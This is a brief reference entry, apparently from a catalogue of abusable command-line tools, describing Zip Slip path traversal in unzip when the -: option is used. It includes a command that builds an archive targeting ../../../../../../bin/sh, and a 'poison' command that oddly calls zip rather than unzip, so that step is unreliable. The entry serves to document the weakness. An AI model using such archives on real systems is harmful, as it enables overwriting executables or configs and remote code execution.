---
title: unzip
tags:
- cli
- input-file
references: https://linux.die.net/man/1/unzip
files: ['*.zip']
---

`unzip` is a widely used archiver. 

## Zip Slip

If `unzip` uses `-:`, it is vulnerable to [Zip Slip](https://security.snyk.io/research/zip-slip-vulnerability), where a malicious archive can overwrite files in any parent directories. It can be used to:
  - Poison the source code
  - Replace an executable or a config file which can lead to RCE
To create a malicious archive:
```sh
zip zipslip.zip ../../../../../../bin/sh
```

To poison:
```sh
zip -: zipslip.zip
```
